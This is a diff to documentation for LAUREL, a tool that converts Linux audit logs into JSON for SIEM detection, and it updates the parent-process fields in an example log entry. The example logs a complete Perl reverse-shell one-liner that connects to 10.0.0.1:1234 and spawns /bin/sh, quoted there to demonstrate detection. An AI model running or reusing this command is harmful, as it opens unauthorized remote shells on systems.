@@ -31,7 +31,7 @@ There are several issues with processing this log file format within a SIEM cont
 
 This is the same log entry, processed by _LAUREL_ into a single log line:
 ``` json
-{"ID":"1626611363.720:348501","SYSCALL":{"arch":"0xc000003e","syscall":59,"success":"yes","exit":0,"a0":"0x55c094deb5c0","a1":"0x55c094dea770","a2":"0x55c094dbf1b0","a3":"0xfffffffffffff286","items":3,"ppid":722076,"pid":724395,"auid":1000,"uid":0,"gid":0,"euid":0,"suid":0,"fsuid":0,"egid":0,"sgid":0,"fsgid":0,"tty":"pts3","ses":3,"comm":"perl","exe":"/usr/bin/perl","subj":"=unconfined","key":null,"ARCH":"x86_64","SYSCALL":"execve","AUID":"user","UID":"root","GID":"root","EUID":"root","SUID":"root","FSUID":"root","EGID":"root","SGID":"root","FSGID":"root"},"EXECVE":{"argc":3,"ARGV":["perl","-e","use Socket;$i=\"10.0.0.1\";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};"]},"CWD":{"cwd":"/root"},"PATH":[{"item":0,"name":"/usr/bin/perl","inode":401923,"dev":"fd:01","mode":"0o100755","ouid":0,"ogid":0,"rdev":"00:00","nametype":"NORMAL","cap_fp":"0x0","cap_fi":"0x0","cap_fe":0,"cap_fver":"0x0","cap_frootid":"0","OUID":"root","OGID":"root"},{"item":1,"name":"/usr/bin/perl","inode":401923,"dev":"fd:01","mode":"0o100755","ouid":0,"ogid":0,"rdev":"00:00","nametype":"NORMAL","cap_fp":"0x0","cap_fi":"0x0","cap_fe":0,"cap_fver":"0x0","cap_frootid":"0","OUID":"root","OGID":"root"},{"item":2,"name":"/lib64/ld-linux-x86-64.so.2","inode":404797,"dev":"fd:01","mode":"0o100755","ouid":0,"ogid":0,"rdev":"00:00","nametype":"NORMAL","cap_fp":"0x0","cap_fi":"0x0","cap_fe":0,"cap_fver":"0x0","cap_frootid":"0","OUID":"root","OGID":"root"}],"PROCTITLE":{"ARGV":["perl","-e","use Socket;$i=\"10.0.0.1\";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_at"]}",PARENT_INFO":{"ARGV":["bash"],"launch_time":1626611323.973,"ppid":3190631}}
+{"ID":"1626611363.720:348501","SYSCALL":{"arch":"0xc000003e","syscall":59,"success":"yes","exit":0,"a0":"0x55c094deb5c0","a1":"0x55c094dea770","a2":"0x55c094dbf1b0","a3":"0xfffffffffffff286","items":3,"ppid":722076,"pid":724395,"auid":1000,"uid":0,"gid":0,"euid":0,"suid":0,"fsuid":0,"egid":0,"sgid":0,"fsgid":0,"tty":"pts3","ses":3,"comm":"perl","exe":"/usr/bin/perl","subj":"=unconfined","key":null,"ARCH":"x86_64","SYSCALL":"execve","AUID":"user","UID":"root","GID":"root","EUID":"root","SUID":"root","FSUID":"root","EGID":"root","SGID":"root","FSGID":"root"},"EXECVE":{"argc":3,"ARGV":["perl","-e","use Socket;$i=\"10.0.0.1\";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};"]},"CWD":{"cwd":"/root"},"PATH":[{"item":0,"name":"/usr/bin/perl","inode":401923,"dev":"fd:01","mode":"0o100755","ouid":0,"ogid":0,"rdev":"00:00","nametype":"NORMAL","cap_fp":"0x0","cap_fi":"0x0","cap_fe":0,"cap_fver":"0x0","cap_frootid":"0","OUID":"root","OGID":"root"},{"item":1,"name":"/usr/bin/perl","inode":401923,"dev":"fd:01","mode":"0o100755","ouid":0,"ogid":0,"rdev":"00:00","nametype":"NORMAL","cap_fp":"0x0","cap_fi":"0x0","cap_fe":0,"cap_fver":"0x0","cap_frootid":"0","OUID":"root","OGID":"root"},{"item":2,"name":"/lib64/ld-linux-x86-64.so.2","inode":404797,"dev":"fd:01","mode":"0o100755","ouid":0,"ogid":0,"rdev":"00:00","nametype":"NORMAL","cap_fp":"0x0","cap_fi":"0x0","cap_fe":0,"cap_fver":"0x0","cap_frootid":"0","OUID":"root","OGID":"root"}],"PROCTITLE":{"ARGV":["perl","-e","use Socket;$i=\"10.0.0.1\";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_at"]}","PARENT_INFO":{"ID":"1626611323.973:348120","ARGV": ["bash"],"exe":"/bin/bash","comm":"bash","ppid":3190631}}
 ```
 
 We can see that our main problems that would have prevented us from identifying the reverse shell have been resolved:
@@ -41,7 +41,7 @@ We can see that our main problems that would have prevented us from identifying 
 
 We can also see the parent process that was used to spawn the reverse shell:
 ``` json
-"PARENT_INFO":{"ARGV":["bash"],"launch_time":1626611323.973,"ppid":3190631}
+"PARENT_INFO":{"ID":"1626611323.973:348120","ARGV":["bash"],"exe":"/bin/bash","comm":"bash","ppid":3190631}
 ```
 
 Every line is a proper JSON document that can be reformatted with _jq_:
@@ -162,10 +162,12 @@ Every line is a proper JSON document that can be reformatted with _jq_:
     ]
   },
   "PARENT_INFO": {
+    "ID": "1626611323.973:348120",
     "ARGV": [
       "bash"
     ],
-    "launch_time": 1626611323.973,
+    "exe": "/bin/bash",
+    "comm": "bash",
     "ppid": 3190631
   }
 }
